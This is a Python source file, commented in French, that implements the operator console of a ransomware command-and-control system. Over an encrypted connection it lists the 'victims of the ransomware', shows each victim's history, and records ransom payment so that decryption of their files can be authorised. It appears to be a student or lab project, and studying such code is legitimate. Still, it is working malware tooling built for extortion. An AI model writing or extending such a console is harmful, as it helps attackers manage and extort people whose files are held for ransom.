from datetime import datetime

import utile.message
import utile.network as network
import utile.message as message
import utile.security as security
import json

# Constantes
IP_SERV_CONSOLE = ''
PORT_SERV_CONSOLE = 0


def main():
    global victim_id
    console = network.connect_to_serv()
    shared_key = security.diffie_hellman_send_key(console)
    print(shared_key)
    while console:
        print("CONSOLE DE CONTRÔLE")
        print("===================")
        print("1) Liste des victimes du ransomware")
        print("2) Historique d'une victime")
        print("3) Renseigner le paiement de rançon d'une victime")
        print("4) Quitter")
        choice = input("Choix : ")

        if choice == "1":
            continuous = True
            encrypted_message = security.aes_encrypt(message.LIST_VICTIM_REQ, shared_key)
            network.send_message(console, encrypted_message)
            while continuous:
               # msg = message.set_message('list_victim_req')
                response = network.receive_message(console)
                if response:
                    decrypted_message = security.aes_decrypt(response,shared_key)
                tab_message = utile.message.get_message_type(decrypted_message)
                print("Réponse du serveur:", decrypted_message)
                if tab_message[0] == "LIST_END":
                    continuous = False
        elif choice == "2":
            continuous = True
            while continuous:
                victim_id = input("ID de la victime : ")
                if (not victim_id.isdigit()):
                    print('Mauvais id')
                else:
                    break
            history_req = message.HISTORY_REQ
            history_req["HIST_REQ"] = victim_id
            network.send_message(console, history_req)
            while continuous:
                response = network.receive_message(console)
                tab_message = utile.message.get_message_type(response)
                print("Réponse du serveur:", response)
                if tab_message[0] == "HIST_END":
                    continuous = False
        elif choice == "3":
            continuous = True
            while continuous:
                victim_id = input("Entrer le numéro de la victime (de 1 à 4) : ")
                if(not victim_id.isdigit() or not int(victim_id) in range(1,5)) :
                    print('Mauvais id')
                    continue
                # Ici il 'agit de recupérer la fonction change state
                change_state = message.CHANGE_STATE
                change_state['CHGSTATE'] = int(victim_id)

                # Ici c'est l'envoi de la requete de changement d'état
                network.send_message(console, change_state)
                # Ici c'est la reception du message par la console de controle
                response = network.receive_message(console)
                # Ici on convertit le message en json en dictionnaire
                response = utile.message.json_to_dict(response)

                new_state = response['STATE']

                if(new_state[3] != "PENDING") :
                    print(f'ERREUR: La victime  {new_state[0]} {response["CHGSTATE"]} est en mode {new_state[3]}')
                else :
                    choice = input(f'Confirmez la demande de déchiffrement pour la victime {new_state[0]} {response["CHGSTATE"]} (o/n) : ')
                    if(choice == 'o') :
                        print('La demande a été prise en compte')
                    else:
                        print('Demande intérrompue')
                    continuous = False
            #print("Réponse du serveur:", response)
        elif choice == "4":
            console.close()
            console = False

    exit(0)


if __name__ == '__main__':
    main()
